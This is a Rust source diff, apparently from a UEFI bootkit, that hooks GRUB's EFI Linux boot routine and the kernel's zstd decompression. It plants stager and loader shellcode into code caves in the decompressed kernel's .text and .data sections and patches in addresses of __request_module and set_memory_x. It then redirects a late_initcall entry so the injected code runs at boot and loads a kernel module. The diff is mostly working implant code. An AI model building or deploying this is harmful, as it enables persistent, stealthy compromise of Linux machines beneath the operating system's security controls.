@@ -1,11 +1,11 @@
 use log::{debug, error, info};
 
 use crate::helpers::{
-    file_helper::{cave_finder, Permissions},
+    file_helper::cave_finder_by_section_name,
     memory_helper::{
-        binary_search, get_initcall_phase_address, inline_jump_hook, restore_inline_hook,
-        translate_physical_to_virtual, InitcallPhase, InlineHook, INLINE_HOOK_SIZE,
-        ZSTD_DECOMPRESS_FUNC_SIGNATURE,
+        INLINE_HOOK_SIZE, InitcallPhase, InlineHook, ZSTD_DECOMPRESS_FUNC_SIGNATURE, binary_search,
+        get_initcall_phase_address, inline_jump_hook, restore_inline_hook,
+        translate_physical_to_virtual,
     },
 };
 
@@ -21,10 +21,15 @@ pub static mut ZSTD_DECOMPRESS_DCTX_HOOK_INLINE: InlineHook = InlineHook {
     original_bytes: [0; INLINE_HOOK_SIZE],
 };
 
-const REQUEST_MODULE_DISTANCE: u8 = 0x45;
 const REQUEST_MODULE_PATTERN: &[u8] = &[0x65, 0x48, 0x8B, 0x05, 0xAB, 0x95];
+const REQUEST_MODULE_DISTANCE: u8 = 0x45;
+const SET_MEMORY_X_PATTERN: &[u8] = &[0x31, 0xC0, 0x48, 0x89, 0xE5, 0x48, 0x83, 0xEC, 0x08];
+const SET_MEMORY_X_DISTANCE: u8 = 6;
 const REQUEST_MODULE_SENTINEL: u64 = 0xDEADBEEFDEADBEEF;
 const ORIGINAL_FN_SENTINEL: u64 = 0xCAFEBABECAFEBABE;
+const CAVE_PAGE_SENTINEL: u64 = 0xBADC0FFEE0DDF00D;
+const SET_MEMORY_X_SENTINEL: u64 = 0xFACEFEEDFACEFEED;
+const LOADER_VIRT_SENTINEL: u64 = 0xDEADFACEDEADFACE;
 
 /// grub_arch_efi_linux_boot_image_hook is an inline hook for the GRUB function responsible for loading Linux boot images on EFI systems.
 /// It restores the original function before executing it to ensure stability, and hooking the Linux kernel.
@@ -194,24 +199,42 @@ pub extern "sysv64" fn zstd_decompress_dctx_hook(
         };
     debug!(
         "Found late_initcall entry: entry_phys={:#x}, entry_virt={:#x}, original_target_virt={:#x}",
-        initcall_info.entry_physical_address, initcall_info.entry_virtual_address, initcall_info.original_target_virtual_address
+        initcall_info.entry_physical_address,
+        initcall_info.entry_virtual_address,
+        initcall_info.original_target_virtual_address
     );
 
-    let code_cave = match cave_finder(
-        dst,
-        dst_capacity,
-        0x1000,
-        Permissions::READ | Permissions::EXECUTE,
-    ) {
+    // Stage 1 — stager (41 bytes) lives in .text (always RX).
+    // Stage 2 — loader lives in .data (initially RW; stager calls set_memory_x first).
+    const STAGER_TEMPLATE: &[u8] = include_bytes!(env!("LKM_STAGER_BIN"));
+    const STAGER_LEN: usize = STAGER_TEMPLATE.len();
+    const LOADER_TEMPLATE: &[u8] = include_bytes!(env!("LKM_LOADER_BIN"));
+    const LOADER_LEN: usize = LOADER_TEMPLATE.len();
+
+    // Find stager cave in .text (STAGER_LEN + 15 bytes for 16-byte alignment headroom).
+    let stager_cave = match cave_finder_by_section_name(dst, dst_capacity, STAGER_LEN, ".text") {
         Some(addr) => addr,
         None => {
-            error!("Failed to find suitable code cave in kernel");
+            error!("Failed to find stager cave in .text");
             return ret_val;
         }
     };
-    debug!("Found suitable code cave at address: {:#x}", code_cave);
+    // let stager_cave = (stager_cave + 15) & !15;
+    // debug!("Stager cave: phys={:#x} (aligned)", stager_cave);
+    debug!("Stager cave: phys={:#x}", stager_cave);
 
-    // Locate __request_module in the decompressed kernel.
+    // Find loader cave in .data (LOADER_LEN + 15 bytes for alignment headroom).
+    let loader_cave = match cave_finder_by_section_name(dst, dst_capacity, LOADER_LEN, ".data") {
+        Some(addr) => addr,
+        None => {
+            error!("Failed to find loader cave in .data");
+            return ret_val;
+        }
+    };
+    // let loader_cave = (loader_cave + 15) & !15;
+    debug!("Loader cave: phys={:#x}", loader_cave);
+
+    // Find __request_module via byte pattern.
     let mut request_module_phys = match binary_search(dst, dst_capacity, REQUEST_MODULE_PATTERN) {
         Some(addr) => addr,
         None => {
@@ -220,8 +243,6 @@ pub extern "sysv64" fn zstd_decompress_dctx_hook(
         }
     };
     request_module_phys -= REQUEST_MODULE_DISTANCE as usize;
-
-    // Translate physical addresses to kernel virtual addresses for the shellcode.
     let request_module_virt =
         match translate_physical_to_virtual(dst, dst_capacity, request_module_phys) {
             Some(addr) => addr,
@@ -235,58 +256,122 @@ pub extern "sysv64" fn zstd_decompress_dctx_hook(
         request_module_phys, request_module_virt
     );
 
-    let code_cave_virt = match translate_physical_to_virtual(dst, dst_capacity, code_cave) {
+    // Find set_memory_x via __ksymtab.
+    let mut set_memory_x_phys = match binary_search(dst, dst_capacity, SET_MEMORY_X_PATTERN) {
         Some(addr) => addr,
         None => {
-            error!("Failed to translate code cave to virtual address");
+            error!("Failed to find set_memory_x");
+            return ret_val;
+        }
+    };
+    set_memory_x_phys -= SET_MEMORY_X_DISTANCE as usize;
+    let set_memory_x_virt = match translate_physical_to_virtual(dst, dst_capacity, set_memory_x_phys) {
+        Some(addr) => addr,
+        None => {
+            error!("Failed to translate set_memory_x to virtual address");
             return ret_val;
         }
     };
     debug!(
-        "Code cave: phys={:#x}, virt={:#x}",
-        code_cave, code_cave_virt
+        "set_memory_x: phys={:#x}, virt={:#x}",
+        set_memory_x_phys, set_memory_x_virt
     );
 
-    // Load the pre-assembled shellcode blob and patch the sentinel values.
-    let shellcode_template: &[u8] = include_bytes!(env!("LKM_LOADER_BIN"));
-    let mut shellcode = [0u8; 512];
-    let shellcode_len = shellcode_template.len();
-    shellcode[..shellcode_len].copy_from_slice(shellcode_template);
+    let stager_cave_virt = match translate_physical_to_virtual(dst, dst_capacity, stager_cave) {
+        Some(addr) => addr,
+        None => {
+            error!("Failed to translate stager cave to virtual address");
+            return ret_val;
+        }
+    };
+    debug!(
+        "Stager cave: phys={:#x}, virt={:#x}",
+        stager_cave, stager_cave_virt
+    );
 
-    // Patch 0xDEADBEEFDEADBEEF -> __request_module virtual address.
-    let sentinel_bytes = REQUEST_MODULE_SENTINEL.to_le_bytes();
-    if let Some(offset) = find_sentinel(&shellcode[..shellcode_len], &sentinel_bytes) {
-        shellcode[offset..offset + 8].copy_from_slice(&(request_module_virt as u64).to_le_bytes());
+    let loader_cave_virt = match translate_physical_to_virtual(dst, dst_capacity, loader_cave) {
+        Some(addr) => addr,
+        None => {
+            error!("Failed to translate loader cave to virtual address");
+            return ret_val;
+        }
+    };
+    debug!(
+        "Loader cave: phys={:#x}, virt={:#x}",
+        loader_cave, loader_cave_virt
+    );
+
+    // Page-aligned virt addr passed as arg1 to set_memory_x(addr, nrpages=1).
+    let loader_cave_page_virt: u64 = (loader_cave_virt & !0xFFF) as u64;
+    debug!(
+        "Loader cave page (for set_memory_x): {:#x}",
+        loader_cave_page_virt
+    );
+
+    // ── Patch stager blob ──────────────────────────────────────────────────────
+    let mut stager = [0u8; STAGER_LEN];
+    stager.copy_from_slice(STAGER_TEMPLATE);
+
+    let sentinel = CAVE_PAGE_SENTINEL.to_le_bytes();
+    if let Some(off) = find_sentinel(&stager, &sentinel) {
+        stager[off..off + 8].copy_from_slice(&loader_cave_page_virt.to_le_bytes());
     } else {
-        error!("Failed to find request_module sentinel in shellcode");
+        error!("Failed to find CAVE_PAGE_SENTINEL in stager");
         return ret_val;
     }
 
-    // Patch 0xCAFEBABECAFEBABE -> original initcall target virtual address.
-    let sentinel_bytes = ORIGINAL_FN_SENTINEL.to_le_bytes();
-    if let Some(offset) = find_sentinel(&shellcode[..shellcode_len], &sentinel_bytes) {
-        shellcode[offset..offset + 8]
+    let sentinel = SET_MEMORY_X_SENTINEL.to_le_bytes();
+    if let Some(off) = find_sentinel(&stager, &sentinel) {
+        stager[off..off + 8].copy_from_slice(&(set_memory_x_virt as u64).to_le_bytes());
+    } else {
+        error!("Failed to find SET_MEMORY_X_SENTINEL in stager");
+        return ret_val;
+    }
+
+    let sentinel = LOADER_VIRT_SENTINEL.to_le_bytes();
+    if let Some(off) = find_sentinel(&stager, &sentinel) {
+        stager[off..off + 8].copy_from_slice(&(loader_cave_virt as u64).to_le_bytes());
+    } else {
+        error!("Failed to find LOADER_VIRT_SENTINEL in stager");
+        return ret_val;
+    }
+
+    // ── Patch loader blob ──────────────────────────────────────────────────────
+    let mut loader = [0u8; LOADER_LEN];
+    loader.copy_from_slice(LOADER_TEMPLATE);
+
+    let sentinel = REQUEST_MODULE_SENTINEL.to_le_bytes();
+    if let Some(off) = find_sentinel(&loader, &sentinel) {
+        loader[off..off + 8].copy_from_slice(&(request_module_virt as u64).to_le_bytes());
+    } else {
+        error!("Failed to find REQUEST_MODULE_SENTINEL in loader");
+        return ret_val;
+    }
+
+    let sentinel = ORIGINAL_FN_SENTINEL.to_le_bytes();
+    if let Some(off) = find_sentinel(&loader, &sentinel) {
+        loader[off..off + 8]
             .copy_from_slice(&(initcall_info.original_target_virtual_address as u64).to_le_bytes());
     } else {
-        error!("Failed to find original_fn sentinel in shellcode");
+        error!("Failed to find ORIGINAL_FN_SENTINEL in loader");
         return ret_val;
     }
 
-    // Write the patched shellcode into the code cave.
+    // ── Write both blobs ───────────────────────────────────────────────────────
     unsafe {
-        core::ptr::copy_nonoverlapping(shellcode.as_ptr(), code_cave as *mut u8, shellcode_len);
+        core::ptr::copy_nonoverlapping(stager.as_ptr(), stager_cave as *mut u8, STAGER_LEN);
+        core::ptr::copy_nonoverlapping(loader.as_ptr(), loader_cave as *mut u8, LOADER_LEN);
     }
     debug!(
-        "Wrote {} bytes of shellcode to code cave at {:#x}",
-        shellcode_len, code_cave
+        "Wrote {} bytes of stager to {:#x}, {} bytes of loader to {:#x}",
+        STAGER_LEN, stager_cave, LOADER_LEN, loader_cave
     );
 
-    // Overwrite the last late_initcall prel32 entry to point at our shellcode.
-    let relative_offset =
-        (code_cave_virt as i64) - (initcall_info.entry_virtual_address as i64);
+    // ── Patch initcall slot (prel32) to point at the stager ────────────────────
+    let relative_offset = (stager_cave_virt as i64) - (initcall_info.entry_virtual_address as i64);
     if relative_offset < i32::MIN as i64 || relative_offset > i32::MAX as i64 {
         error!(
-            "Code cave too far from initcall entry for prel32: delta={:#x}",
+            "Stager cave too far from initcall entry for prel32: delta={:#x}",
             relative_offset
         );
         return ret_val;
@@ -298,8 +383,11 @@ pub extern "sysv64" fn zstd_decompress_dctx_hook(
         );
     }
     info!(
-        "Patched late_initcall entry at virt={:#x} (phys={:#x}) with prel32 offset {:#x} -> shellcode at virt={:#x}",
-        initcall_info.entry_virtual_address, initcall_info.entry_physical_address, relative_offset as i32, code_cave_virt
+        "Patched late_initcall entry at virt={:#x} (phys={:#x}) prel32={} -> stager at virt={:#x}",
+        initcall_info.entry_virtual_address,
+        initcall_info.entry_physical_address,
+        relative_offset as i32,
+        stager_cave_virt
     );
 
     ret_val
